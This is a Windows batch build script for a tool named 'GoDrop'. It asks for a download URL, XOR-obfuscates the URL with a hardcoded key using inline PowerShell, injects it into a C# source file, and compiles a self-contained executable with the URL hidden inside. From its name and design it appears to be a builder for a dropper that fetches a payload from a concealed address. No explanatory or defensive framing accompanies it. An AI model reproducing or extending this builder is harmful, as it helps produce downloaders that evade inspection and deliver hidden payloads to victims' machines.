@echo off
setlocal

set /p URL=Enter direct artifact URL (http/https): 
if "%URL%"=="" (
  echo URL is required.
  exit /b 1
)

if not exist ..\..\dist mkdir ..\..\dist

for /f "usebackq delims=" %%H in (`powershell -NoProfile -Command "$k=[Text.Encoding]::UTF8.GetBytes('GoDropEmbedKey2026');$u=[Text.Encoding]::UTF8.GetBytes($env:URL);$o=for($i=0;$i -lt $u.Length;$i++){ '{0:x2}' -f ($u[$i] -bxor $k[$i %% $k.Length]) };($o -join '')"`) do set ENC_URL=%%H
if "%ENC_URL%"=="" (
  echo Failed to encrypt URL.
  exit /b 1
)

powershell -NoProfile -Command "(Get-Content Program.cs -Raw).Replace('__ENC_URL__','%ENC_URL%') | Set-Content Program.generated.cs"
if errorlevel 1 exit /b 1

copy Program.cs Program.cs.bak >nul
copy Program.generated.cs Program.cs >nul
if errorlevel 1 exit /b 1

echo Building C# executable...
dotnet publish GoDrop.csproj -c Release -r win-x64 --self-contained true -o ..\..\dist\godrop-csharp
if errorlevel 1 exit /b 1
copy ..\..\dist\godrop-csharp\GoDrop.exe ..\..\dist\godrop-csharp.exe >nul

copy Program.cs.bak Program.cs >nul 2>&1
del Program.cs.bak >nul 2>&1
del Program.generated.cs >nul 2>&1

echo Built: ..\..\dist\godrop-csharp.exe
echo Embedded encrypted URL in binary.
endlocal
